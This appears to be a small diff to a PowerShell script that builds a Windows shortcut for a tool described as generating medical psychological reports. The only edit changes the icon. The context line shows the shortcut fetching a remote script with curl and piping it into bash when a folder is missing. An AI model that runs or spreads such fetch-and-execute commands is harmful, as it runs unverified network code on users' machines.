@@ -23,7 +23,7 @@ $Shortcut.Arguments = 'bash -c "cd ~ && ([ -d MEDMCQ261225 ] || bash <(curl -s h
 
 $Shortcut.WorkingDirectory = "%USERPROFILE%"
 $Shortcut.Description = "Generate medical psychological reports"
-$Shortcut.IconLocation = "%SystemRoot%\System32\imageres.dll,1"
+$Shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll,70"
 
 # Save the shortcut
 $Shortcut.Save()
